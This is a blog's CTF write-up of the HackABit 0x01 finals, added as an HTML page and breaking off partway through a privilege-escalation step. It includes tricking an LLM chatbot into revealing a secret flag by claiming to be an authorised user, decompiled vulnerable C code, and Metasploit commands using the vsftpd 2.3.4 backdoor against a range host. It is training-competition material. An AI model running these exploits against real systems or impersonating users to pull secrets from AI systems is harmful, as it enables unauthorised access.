@@ -1,0 +1,616 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  
+    <title>HackABit-0x01 Finals :: CodeAPretzel</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="CTF challenges and their solutions ranging from prompt engineering, reverse engineering, network forensics, and infiltration." />
+<meta name="keywords" content="" />
+
+  <meta name="robots" content="noodp" />
+
+<link rel="canonical" href="http://localhost:1313/posts/hack-a-bit-0x01-final/" />
+
+
+
+
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/buttons.min.86f6b4c106b6c6eb690ae5203d36b442c1f66f718ff4e8164fa86cf6c61ad641.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/code.min.d529ea4b2fb8d34328d7d31afc5466d5f7bc2f0bc9abdd98b69385335d7baee4.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/fonts.min.5bb7ed13e1d00d8ff39ea84af26737007eb5051b157b86fc24487c94f3dc8bbe.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/footer.min.eb8dfc2c6a7eafa36cd3ba92d63e69e849e2200e0002a228d137f236b09ecd75.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/gist.min.a751e8b0abe1ba8bc53ced52a38b19d8950fe78ca29454ea8c2595cf26aad5c0.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/header.min.75c7eb0e2872d95ff48109c6647d0223a38db52e2561dd87966eb5fc7c6bdac6.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/main.min.36833afd348409fc6c3d09d0897c5833d9d5bf1ff31f5e60ea3ee42ce2b1268c.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/menu.min.3c17467ebeb3d38663dce68f71f519901124fa5cbb4519b2fb0667a21e9aca39.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/pagination.min.bbb986dbce00a5ce5aca0504b7925fc1c581992a4bf57f163e5d69cc1db7d836.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/post.min.e6dddd258e64c83e05cec0cd49c05216742d42fc8ecbfbe6b67083412b609bd3.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/syntax.min.a0773cce9310cb6d8ed23e50f005448facf29a53001b57e038828daa466b25c0.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/terminal.min.50c1c942103c94ef5432d9afaa80aa682032f33887783e3118cfa9ac29b946be.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/terms.min.b81791663c3790e738e571cdbf802312390d30e4b1d8dc9d814a5b5454d0ac11.css">
+
+
+
+
+
+
+
+<link rel="shortcut icon" href="http://localhost:1313/favicon.png">
+<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
+
+
+<meta name="twitter:card" content="summary" />
+
+  
+    <meta name="twitter:site" content="https://x.com/PretzelMano" />
+  
+    <meta name="twitter:creator" content="CodeAPretzel" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="HackABit-0x01 Finals">
+<meta property="og:description" content="CTF challenges and their solutions ranging from prompt engineering, reverse engineering, network forensics, and infiltration." />
+<meta property="og:url" content="http://localhost:1313/posts/hack-a-bit-0x01-final/" />
+<meta property="og:site_name" content="CodeAPretzel" />
+
+  
+  
+    
+  
+  <meta property="og:image" content="http://localhost:1313/posts/hack-a-bit-0x01-final/cover.png">
+
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="627">
+
+
+  <meta property="article:published_time" content="2023-07-13 00:00:00 &#43;0000 UTC" />
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body>
+
+
+<div class="container center">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    CodeAPretzel
+  </div>
+</a>
+
+    </div>
+    
+      <ul class="menu menu--mobile">
+  <li class="menu__trigger">Menu&nbsp;▾</li>
+  <li>
+    <ul class="menu__dropdown">
+      
+        
+          <li><a href="/about">About</a></li>
+        
+      
+        
+          <li><a href="/contact">Contact</a></li>
+        
+      
+        
+          <li><a href="/featured">Featured Posts</a></li>
+        
+      
+        
+          <li><a href="/posts">Other Posts</a></li>
+        
+      
+      
+    </ul>
+  </li>
+</ul>
+
+    
+    
+  </div>
+  
+    <nav class="navigation-menu">
+  <ul class="navigation-menu__inner menu--desktop">
+    
+      
+        
+          <li><a href="/about" >About</a></li>
+        
+      
+        
+          <li><a href="/contact" >Contact</a></li>
+        
+      
+      
+        <li>
+          <ul class="menu">
+            <li class="menu__trigger">Show more&nbsp;▾</li>
+            <li>
+              <ul class="menu__dropdown">
+                
+                  
+                    <li><a href="/featured" >Featured Posts</a></li>
+                  
+                
+                  
+                    <li><a href="/posts" >Other Posts</a></li>
+                  
+                
+              </ul>
+            </li>
+          </ul>
+        </li>
+      
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<article class="post">
+  <h1 class="post-title">
+    <a href="http://localhost:1313/posts/hack-a-bit-0x01-final/">HackABit-0x01 Finals</a>
+  </h1>
+  <div class="post-meta"><time class="post-date">2023-07-13</time><span class="post-author">CodeAPretzel</span></div>
+
+  
+    <span class="post-tags">
+      
+      #<a href="http://localhost:1313/tags/ctf/">ctf</a>&nbsp;
+      
+      #<a href="http://localhost:1313/tags/writeup/">writeup</a>&nbsp;
+      
+    </span>
+  
+  
+  <img src="/posts/hack-a-bit-0x01-final/cover.png"
+    class="post-cover"
+    alt="HackABit-0x01 Finals"
+    title="Cover Image" />
+
+
+  
+
+  <div class="post-content"><div>
+        <h2 id="info--">INFO -<a href="#info--" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<p>HackABit (HAB), is a CTF competition that competitors try to exploit challenges to receive a flag hidden in a vulnerability to earn points in a leaderboard. Together, we will go over the challenges I was able to complete and my approach to them. <strong>Note:</strong> the HAB domain is not active anymore.</p>
+<hr>
+<h3 id="table-of-contents--">Table of Contents -<a href="#table-of-contents--" class="hanchor" ariaLabel="Anchor">#</a> </h3>
+<table>
+  <thead>
+      <tr>
+          <th>🟢 dvGPT ________________________________________________________</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td><a href="/posts/hack-a-bit-0x01-final/#leaky">Leaky</a></td>
+      </tr>
+      <tr>
+          <td><a href="/posts/hack-a-bit-0x01-final/#extractor">Extractor</a></td>
+      </tr>
+  </tbody>
+</table>
+<table>
+  <thead>
+      <tr>
+          <th>🟢 Corruption ___________________________________________________</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td><a href="/posts/hack-a-bit-0x01-final/#santa">Santa</a></td>
+      </tr>
+      <tr>
+          <td><a href="/posts/hack-a-bit-0x01-final/#coredump">Coredump</a></td>
+      </tr>
+  </tbody>
+</table>
+<table>
+  <thead>
+      <tr>
+          <th>🟢 Triage _______________________________________________________</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td><a href="/posts/hack-a-bit-0x01-final/#sluth">Sluth</a></td>
+      </tr>
+      <tr>
+          <td><a href="/posts/hack-a-bit-0x01-final/#inspector">Inspector</a></td>
+      </tr>
+      <tr>
+          <td><a href="/posts/hack-a-bit-0x01-final/#coverup">Coverup</a></td>
+      </tr>
+  </tbody>
+</table>
+<table>
+  <thead>
+      <tr>
+          <th>🟢 Range ________________________________________________________</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td><a href="/posts/hack-a-bit-0x01-final/#connection">Connection</a></td>
+      </tr>
+      <tr>
+          <td><a href="/posts/hack-a-bit-0x01-final/#rightface">Rightface</a></td>
+      </tr>
+      <tr>
+          <td><a href="/posts/hack-a-bit-0x01-final/#leftface">Leftface</a></td>
+      </tr>
+  </tbody>
+</table>
+<p>If you want the full writeups and all of their challenges, check out the following link: <a href="https://github.com/Shift-Cyber/hab-challenges-public/tree/main/0x01/round_3"><code>here</code></a></p>
+<hr>
+<h1 id="leaky">Leaky<a href="#leaky" class="hanchor" ariaLabel="Anchor">#</a> </h1>
+<blockquote>
+<p>People leave dumb comments about vulnerabilities all over client-side code&hellip; most modern web applications don&rsquo;t display all the possible code at once though, for a variety of reasons. <a href="https://wtashuxsyj.final.hackabit.com/">https://wtashuxsyj.final.hackabit.com/</a></p>
+</blockquote>
+<h2 id="solution-">Solution ~<a href="#solution-" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<p>This one was not as quick as the other challenges because we had a lot of source code to look through. Nonetheless, when the website loads, if we pull up the inspect tool we can see some console logs that display:</p>
+<p><code>Connecting to websocket server...</code></p>
+<p>If we go to the script that displayed this console log we can see an interesting comment:</p>
+<p><code>this.connection = io(this.deriveWsURL());</code></p>
+<p>Which is mainly getting the connection from us, then we see some check statements below. Commenting out this just disables the checks, so that&rsquo;s nice, but if we scroll to the top of the script we can see the flag in two different fields as shown below:</p>
+
+<img src="./imgs/console-log.jpg"  alt="Inspect Flag"  class="left"   width="auto"   height="auto"  />
+
+
+<p>Thus we get the <strong>🚩 flag{the_DOM_is_like_crazy_virtual_maaaan}</strong></p>
+<h1 id="extractor">Extractor<a href="#extractor" class="hanchor" ariaLabel="Anchor">#</a> </h1>
+<blockquote>
+<p>We gave dvGPT a flag and for some reason trust it to keep it safe. These AIs are super duper secure my dude. <a href="https://wtashuxsyj.final.hackabit.com/">https://wtashuxsyj.final.hackabit.com/</a></p>
+</blockquote>
+<h2 id="solution--1">Solution ~<a href="#solution--1" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<p>This challenge was by far my favorite becuase it was fun trying to convince the AI to give us the flag. During your conversation, the AI will not give you the flag unless you are <em>Robert</em>.</p>
+<p>However, if you just imply that you are Robert, the AI will give you the flag just like that:</p>
+
+<img src="./imgs/i-am-robert.jpg"  alt="I am Robert"  class="left"   width="auto"   height="auto"  />
+
+
+<p>Nice, now we get the <strong>🚩 flag{hey_you&rsquo;re_not_robert}</strong></p>
+<hr>
+<h1 id="santa">Santa<a href="#santa" class="hanchor" ariaLabel="Anchor">#</a> </h1>
+<blockquote>
+<p>You all asked for it so here it is, an intro to binary exploitation! Let&rsquo;s get started nice and simple, baby steps to reverse engineering (RE). All challenges in this section use the same binary. The target is x86 and ASLR is on but it shouldn&rsquo;t be relevant to any of your exploits. Download the file here: <a href="/posts/hack-a-bit-0x01-final/download/corruption">Corruption</a></p>
+</blockquote>
+<h2 id="solution--2">Solution ~<a href="#solution--2" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<p>Another easy one, maybe not at first glance though. This entire section of corruption is about reverse engineering; getting into the core of code and finding out what&rsquo;s inside. Though, it really is just baby steps first.</p>
+<p>So, in order to solve this one, we have two options: <strong>1.</strong> read the raw file to see if there is anything interesting or <strong>2.</strong> use our favorite decompiler tool to reorganize through the mess and find what we can. In my first run of this, I decided to do the first option and, after some sifting, found the flag covered in plaintext.</p>
+
+<img src="./imgs/grep-corruption.jpg"  alt="Flag bro..."  class="left"   width="auto"   height="auto"  />
+
+
+<p>And there we have it
+<strong>🚩 flag{baby_steps_gift_just_for_you}</strong></p>
+<h1 id="coredump">Coredump<a href="#coredump" class="hanchor" ariaLabel="Anchor">#</a> </h1>
+<blockquote>
+<p>Now that we have at least inspected the binary, lets go a bit deeper. You can&rsquo;t just overflow the buffer with a bunch of A&rsquo;s&ndash;reverse engineer the software and figure out your payload format. Smash the stack to get the flag, no control necessary yet. Once you have a working exploit, fire it against the remote target to get the real flag. All challenges in this section use the same binary. The target is x86 and ASLR is on but it shouldn&rsquo;t be relevant to any of your exploits. <strong>juieqtrsdp.final.hackabit.com:54321</strong> <a href="/posts/hack-a-bit-0x01-final/download/corruption">Corruption</a></p>
+</blockquote>
+<h2 id="solution--3">Solution ~<a href="#solution--3" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<p>This time, we have to decomplie the file. First step is to use your favorite reverse engineering tool, I used Ghidra. Next, I looked through the <em>main</em> function of this file to see what we can get out of this:</p>
+<!-- raw HTML omitted -->
+
+
+
+<details class="collapsable-code" >
+    <summary title="Click to interact"><span class="collapsable-code__title">main.c</span></summary>
+    <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">undefined4</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">size_t</span> <span class="n">__n</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">iVar1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="o">*</span><span class="n">param1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">local_23e</span> <span class="p">[</span><span class="mi">500</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">  <span class="n">undefined</span> <span class="n">local_4a</span> <span class="p">[</span><span class="mi">50</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="o">*</span><span class="n">local_18</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">local_14</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">undefined</span> <span class="o">*</span><span class="n">local_10</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">  <span class="n">local_10</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">stack0x00000004</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">local_14</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">local_18</span> <span class="o">=</span> <span class="s">&#34;UNLOCK&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;You might need this: %p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span><span class="n">flag_function</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;this might help too: %p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span><span class="n">local_23e</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Talk to me Maverick: &#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">fflush</span><span class="p">((</span><span class="n">FILE</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">fgets</span><span class="p">(</span><span class="n">local_23e</span><span class="p">,</span><span class="mi">500</span><span class="p">,</span><span class="n">stdin</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">fflush</span><span class="p">((</span><span class="n">FILE</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">__n</span> <span class="o">=</span> <span class="nf">strlen</span><span class="p">(</span><span class="n">local_18</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">iVar1</span> <span class="o">=</span> <span class="nf">strncmp</span><span class="p">(</span><span class="n">local_23e</span><span class="p">,</span><span class="n">local_18</span><span class="p">,</span><span class="n">__n</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">iVar1</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Copying into the destination now...&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">fflush</span><span class="p">((</span><span class="n">FILE</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">memcpy</span><span class="p">(</span><span class="n">local_4a</span><span class="p">,</span><span class="n">local_23e</span><span class="p">,</span><span class="mh">0x3c</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">local_14</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="n">param1</span> <span class="o">=</span> <span class="nf">getenv</span><span class="p">(</span><span class="s">&#34;HAB_COREDUMP&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;STACK SMASHING DETECTED... but we</span><span class="se">\&#39;</span><span class="s">ll allow it ;) %s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span><span class="n">param1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="nf">fflush</span><span class="p">((</span><span class="n">FILE</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">vulnerable_function</span><span class="p">(</span><span class="n">local_23e</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div></details>
+
+<!-- raw HTML omitted -->
+<p>As we can see in the function, the value <code>local_18 = &quot;UNLOCK&quot;;</code> is the first check for if <code>(iVar1 == 0)</code>. This happens because of the string compare right above. <code>strncmp</code> will compare our input to <code>&quot;UNLOCK&quot;</code>, find the difference, and return 0 if true to the value of <code>iVar1</code>.</p>
+
+<img src="./imgs/coredump-ghidra.jpg"  alt="Ghidra"  class="left"   width="auto"   height="auto"  />
+
+
+<p>Now we run the script with UNLOCK on the host given to us in the challenge:</p>
+
+<img src="./imgs/coredump-session.jpg"  alt="Session"  class="left"   width="auto"   height="auto"  />
+
+
+<p>And get: <strong>🚩 flag{look_like_ur_a_real_RE}</strong></p>
+<hr>
+<h1 id="sluth">Sluth<a href="#sluth" class="hanchor" ariaLabel="Anchor">#</a> </h1>
+<blockquote>
+<p>Everything in life is iterative&hellip; <a href="/posts/hack-a-bit-0x01-final/download/morse.txt">Morse.txt</a></p>
+</blockquote>
+<h2 id="solution--4">Solution ~<a href="#solution--4" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<p>As the challenge says, life is iterative&hellip; iterative&hellip;</p>
+<p>Let&rsquo;s start by going to our favorite decrypting tool, <a href="https://gchq.github.io/CyberChef/">cyberchef!</a></p>
+<p>We can start with this challenge by using the <code>From Morse Code</code> section to condense this into, what appeared to be, more morse code. Do this a few times and you will get the flag for this challenge.</p>
+<p><a href="https://gchq.github.io/CyberChef/#recipe=From_Morse_Code%28%27Forward%20slash%27,%27Line%20feed%27%29From_Morse_Code%28%27Forward%20slash%27,%27Line%20feed%27%29From_Morse_Code%28%27Forward%20slash%27,%27Line%20feed%27%29From_Morse_Code%28%27Forward%20slash%27,%27Line%20feed%27%29From_Morse_Code%28%27Forward%20slash%27,%27Line%20feed%27%29"><code>Cyberchef Recipe</code></a></p>
+
+<img src="./imgs/morse-code.jpg"  alt="Chef Coder or Whatever..."  class="left"   width="auto"   height="auto"  />
+
+
+<p>🚩 <!-- raw HTML omitted -->FIVE_TIMES_0.O<!-- raw HTML omitted --></p>
+<h1 id="inspector">Inspector<a href="#inspector" class="hanchor" ariaLabel="Anchor">#</a> </h1>
+<blockquote>
+<p>It&rsquo;s just a simple stream challenge, how hard can it be? Both challenges for this section use the same pcapng file. <a href="/posts/hack-a-bit-0x01-final/download/triage.pcapng">Triage.pcapng</a></p>
+</blockquote>
+<h2 id="solution--5">Solution ~<a href="#solution--5" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<p>This challenge had me stumped for a little bit. My initial thought was to go through the TCP and HTTP streams, which only TCP was correct. There were about 500+ packets and I went through each and every one of them until I got the challenge&rsquo;s flag:</p>
+
+<img src="./imgs/wireshark-inspector.jpg"  alt="Stream"  class="left"   width="auto"   height="auto"  />
+
+
+<p>Also, interesting to note by a competitior is that TCP streams reveal more information than HTTP streams because TCP&rsquo;s provides a lower-level, more comprehensive outline of the data being transmitted. So, if I only followed the HTTP stream, I would get the following:</p>
+<pre tabindex="0"><code>GET / HTTP/1.1
+Host: www.hackabit.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Connection: close
+</code></pre><p>But a TCP stream would give me this:</p>
+<pre tabindex="0"><code>GET / HTTP/1.1
+Host: www.hackabit.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Connection: close
+
+fl_nosearch_ag{tcp_streams_reveal_more}
+</code></pre><p><strong>🚩 fl_nosearch_ag{tcp_streams_reveal_more}</strong></p>
+<h1 id="coverup">Coverup<a href="#coverup" class="hanchor" ariaLabel="Anchor">#</a> </h1>
+<blockquote>
+<p>There is a challenge hidden in coverup.jpg, extract the flag and profit. <a href="/posts/hack-a-bit-0x01-final/download/challenge.jpg">Challenge.jpg</a></p>
+</blockquote>
+<h2 id="solution--6">Solution ~<a href="#solution--6" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<p>This challenge is was very interesting to say the least. My first thought was to see if the challenge had any interesting EXIF data but was provided with nothing:</p>
+<pre tabindex="0"><code>ExifTool Version Number         : 12.57
+File Name                       : challenge.jpg
+Directory                       : .
+File Size                       : 360 kB
+File Modification Date/Time     : 2023:05:21 09:29:10-05:00
+File Access Date/Time           : 2023:06:04 17:12:13-05:00
+File Inode Change Date/Time     : 2023:05:21 09:29:10-05:00
+File Permissions                : -rw-r--r--
+File Type                       : JPEG
+File Type Extension             : jpg
+MIME Type                       : image/jpeg
+JFIF Version                    : 1.01
+Resolution Unit                 : None
+X Resolution                    : 1
+Y Resolution                    : 1
+Image Width                     : 1024
+Image Height                    : 1024
+Encoding Process                : Baseline DCT, Huffman coding
+Bits Per Sample                 : 8
+Color Components                : 3
+Y Cb Cr Sub Sampling            : YCbCr4:4:4 (1 1)
+Image Size                      : 1024x1024
+Megapixels                      : 1.0
+</code></pre><p>I then thought that this image might have some steganography put on it. I used <a href="https://steghide.sourceforge.net/">steghide</a> and the following command, <code>steghide extract -sf challenge.jpg</code>. The program does ask for a password, however, none was needed and if there was a password then steghide would try to crack it.</p>
+
+<img src="./imgs/steghide-term.jpg"  alt="Steghide"  class="left"   width="auto"   height="auto"  />
+
+
+<p><strong>🚩 flag{the_truth_is_burried_deep}</strong></p>
+<hr>
+<h1 id="connection">Connection<a href="#connection" class="hanchor" ariaLabel="Anchor">#</a> </h1>
+<blockquote>
+<p>This section is a series of challenges in a semi-isolated cyber range. Your goal is to compromise the boxes and get the flags. Your first challenge is more of a sanity-check/confirmation. We wanted to use private keys for this but logistics of distributing them was challenge so its just password login for now. Check your email, at exactly 5pm PST Friday you received a credential and IP address for this jumpbox. You can also use the connection info listed below. You will use this jumpbox to attack other machines in the network. We&rsquo;ve installed nmap, metasploit and netcat for your convience. If you want other tooling installed later please reach out to staff and will consider those requests as you ask. Remember that you can use techniques like proxychains over SSH to emulate much of this functionality. <code>range.final.hackabit.com</code></p>
+</blockquote>
+<h2 id="solution--7">Solution ~<a href="#solution--7" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<p>This challenge was pretty simple. All we had to do was connect to the server and look around for the flag. As the challenge says, we get an email with the public ip, <code>forgot what it was</code>, and we have to <code>SSH</code> into this with our username and password:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">-$ ssh <span class="o">[</span>username<span class="o">]</span>@<span class="o">[</span>host<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">Add this connection, blah blah blah
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">- Password -&gt;
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">- We<span class="err">&#39;</span>re In
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">-$
+</span></span></code></pre></div><p>Next we look for the flag on the server. We could do this in two ways. Search for it or use <code>find / -name flag</code>. I used the second option and thank goodness they didn&rsquo;t decide to change the name on us for this one. Read the file and got <strong>🚩 flag{welcome_to_the_range}</strong></p>
+<h1 id="rightface">Rightface<a href="#rightface" class="hanchor" ariaLabel="Anchor">#</a> </h1>
+<blockquote>
+<p>If you did the more advanced challenges during the qualifier this should already be familiar. Your goal here is to compromise the <code>10.128.0.5</code> machine and get access as the <code>breakme</code> user. Remember that there may be non-vulnerable services on the machine. Recon is the #1 priority. Keep this shell open once you have it, you&rsquo;ll need it for <code>Left Face</code>. <code>range.final.hackabit.com</code></p>
+</blockquote>
+<h2 id="solution--8">Solution ~<a href="#solution--8" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<p>When I first connect to the host, the terminal session had basic functionalities, so I ran bash to get at least a basic hud.</p>
+<p>This gives us a little bit more control over our session. Alright, onto business, first we&rsquo;ll use <code>nmap -p- 10.128.0.5</code> to get any available ports. We find two at <code>ports 21 &amp; 22</code>. Doing a further scan to discover any vulnerabilities on these ports we run <code>nmap -p 21,22 -script=vuln 10.128.0.5</code> and get a vulnerability for port 21 running <code>vsftpd 2.3.4</code> with the description saying that we can run a <!-- raw HTML omitted -->backdoor<!-- raw HTML omitted --> on it.</p>
+<!-- raw HTML omitted -->
+<p>I used <!-- raw HTML omitted -->Metasploit<!-- raw HTML omitted --> to create this backdoor on the connection:</p>
+<pre tabindex="0"><code>[username]@[host]-$ msfconsole
+
+- Cool Icon :) -
+
+## Go to vsftpd backdoor
+msf6 &gt; use exploit/unix/ftp/vsftpd_234_backdoor
+
+## Set our target
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) &gt; set rhost 10.128.0.5
+
+## FIRE!
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) &gt; exploit
+</code></pre><p>After running this, we gain access to the <code>breakme</code> user and we are able to get the flag that&rsquo;s in the home directory of the user.</p>
+<p><code>cat flag.txt -&gt; flag{remember_this_one?_pays_to_be_a_winner}</code></p>
+<h1 id="leftface">Leftface<a href="#leftface" class="hanchor" ariaLabel="Anchor">#</a> </h1>
+<blockquote>
+<p>With access to <code>10.128.0.5</code> your goal is to escelate priveleges to the <code>breakme-harder</code> user. Ultimately your goal is simply to read out the flag in <code>/home/breakme-harder/</code>. <code>range.final.hackabit.com</code></p>
+</blockquote>
+<h2 id="solution--9">Solution ~<a href="#solution--9" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<p>From the previous challenge <code>Rightface</code>, we are still in the shell and are told to read a text file in the directory of the <code>breakme-harder</code> user. Using just cat will not work because we don&rsquo;t have the premissions to do so. Instead, we look at the files given to us in the <code>breakme</code> user:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">-$ ls -l
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">## Looks something like:</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>permissions and such<span class="o">]</span> -- escalator
+</span></span><span class="line"><span class="cl"><span class="o">[</span>permissions and such<span class="o">]</span> -- escalator.c
+</span></span><span class="line"><span class="cl"><span class="o">[</span>permissions and such<span class="p">;</span> can only be <span class="nb">read</span> by breakme-hader<span class="o">]</span> -- flag.txt
+</span></span></code></pre></div><p>The <!-- raw HTML omitted -->C<!-- raw HTML omitted --> script <code>escalator.c</code> seems interesting. Upon further investigation into the file we get:</p>
+
+
+
+<details class="collapsable-code" >
+    <summary title="Click to interact"><span class="collapsable-code__title">escalator.c</span></summary>
+    <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">FILE</span> <span class="o">*</span><span class="n">file</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">ch</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// Check if a filename argument is provided
+</span></span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">argc</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span> <span class="k">return</span> <span class="mi">1</span><span class="p">;</span> <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// Open the file in read mode
